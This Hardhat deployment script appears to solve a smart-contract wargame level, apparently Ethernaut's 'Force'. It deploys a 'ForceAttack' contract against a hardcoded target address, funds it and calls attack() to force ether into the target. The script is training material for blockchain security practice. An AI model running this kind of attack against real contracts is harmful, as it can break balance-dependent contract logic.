import { ethers } from "hardhat"

async function main() {
  const playerAddress = "0xD028d504316FEc029CFa36bdc3A8f053F6E5a6e4"
  const targetAddress = "0xD79AB03090436e57463144d5FFbcaA674F6E8434"

  const ForceAttack = await ethers.getContractFactory("ForceAttack")
  const forceAttack = await ForceAttack.deploy(targetAddress)

  console.log("starting")

  const { address: forceContractAddress } = await forceAttack.deployed()

  console.log("ForceAttack deployed to:", forceContractAddress)

  const signer = await ethers.provider.getSigner(playerAddress)

  await signer.sendTransaction({
    to: forceContractAddress,
    value: ethers.utils.parseEther("0.001"),
    gasLimit: 1000000,
  })

  console.log("Eth sent to force attack contract")

  await forceAttack.attack()

  console.log("Done!")
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })
